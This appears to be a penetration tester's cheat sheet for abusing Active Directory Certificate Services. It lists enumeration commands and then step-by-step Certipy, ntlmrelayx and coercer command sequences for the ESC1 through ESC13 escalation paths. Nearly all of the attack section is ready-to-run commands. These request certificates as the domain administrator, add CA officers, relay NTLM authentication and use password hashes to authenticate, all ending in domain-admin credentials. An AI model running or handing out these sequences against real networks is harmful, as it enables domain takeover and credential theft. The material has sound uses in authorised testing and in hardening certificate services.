# Attacks
- [ESC1](#esc1)
- [ESC3](#esc3)
- [ESC4](#esc4)
- [ESC6](#esc6)
- [ESC7](#esc7)
- [ESC8](#esc8)
- [ESC9](#esc9)
- [ESC13](#esc13)

# Enumeration
### NetExec
Find PKI Enrollment Services in Active Directory and Certificate Templates Names
```
nxc ldap ip -u username -p password -M adcs
```
### Certipy
Search for vulnerable certificate templates
```
certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
```
### Certify
Search for vulnerable certificate templates
```powershell
Certify.exe find /vulnerable
```
# Attacks
## ESC1
```
addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password
```
```
certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator -dc-ip ip
```
Or
```
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip
```
> Sometimes if you run certipy and see `Minimum RSA Key Length              : 4096`, you need to provide `-key-size 4096` to certipy
```bash
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096
```
```
certipy auth -pfx administrator.pfx -domain domain -username username -dc-ip ip
```
## ESC3
```
certipy req -username username -password password -ca ca -target domain -template template
```
```
certipy req username -password password -ca ca -target domain -template User -on-behalf-of 'domain\administrator' -pfx pfx_file
```
```
certipy auth -pfx administrator.pfx -dc-ip ip
```
## ESC4
```
certipy template -username username -password password -template template -save-old -dc-ip ip
```
```
certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator
```
```
certipy auth -pfx administrator.pfx -domain domain -username administrator -dc-ip ip
```
## ESC6
```
certipy req -username administrator@domain -password password -ca ca -target domain -template template -upn administrator
```
## ESC7
```
certipy ca -ca ca -add-officer username -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
```
```
certipy ca -ca ca -enable-template SubCA -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
```
```
certipy req -username username@domain -password password -ca ca -target ip -template SubCA -upn username@domain
```
```
certipy ca -ca ca -issue-request request_ID -username username@domain -password password
```
```
certipy req -username username@domain -password password -ca ca -target ip -retrieve request_ID
```
```
certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
```
## ESC8
```
ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server
```
```
coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
```
```
certipy- auth -pfx administrator.pfx
```
## ESC9
```
certipy shadow auto -username username@domain -hashes :hash -account target_username
```
```
certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
```
```
certipy req -username target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
```
```
certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
```
```
certipy auth -pfx administrator.pfx -domain domain
```
## ESC13
```
certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
```
```
python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
```
# Resources
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration
- https://vulndev.io/2023/07/01/vl-intercept-walkthrough/
- https://www.bulletproof.co.uk/blog/abusing-esc13-from-linux
- https://logan-goins.com/2024-05-04-ADCS/
- https://www.tarlogic.com/blog/ad-cs-esc7-attack/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/
# Tools
- https://github.com/ly4k/Certipy
- https://github.com/GhostPack/Certify